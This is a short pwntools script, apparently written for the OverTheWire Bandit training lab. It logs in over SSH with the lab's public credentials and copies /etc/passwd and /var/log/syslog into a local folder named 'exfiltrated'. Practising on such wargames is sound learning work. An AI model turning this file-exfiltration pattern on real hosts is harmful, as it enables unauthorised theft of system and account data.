from pwn import *
import os

username = "bandit0"
host = "bandit.labs.overthewire.org"
password = "bandit0"
port = 2220

shell = ssh(username, host, password=password, port=port)
exfil_files = ['/etc/passwd', '/var/log/syslog', ]
directory = 'exfiltrated'

def download_data(shell):
    print "Exfiltrating : " + shell.distro[0] + shell.distro[1] + " with user: " + str(shell['whoami'])
    for exfil_file in exfil_files:
        print exfil_file
        to_dl = shell.download_data(exfil_file)
        if to_dl:
            if not os.path.exists(directory):
                os.makedirs(directory)
            with open(directory + "/" + exfil_file.split("/")[-1]+".txt", "w") as exfils:
                    exfils.write(to_dl)

if shell.connected():
    print("whoami?: " + shell['whoami'])
    download_data(shell)

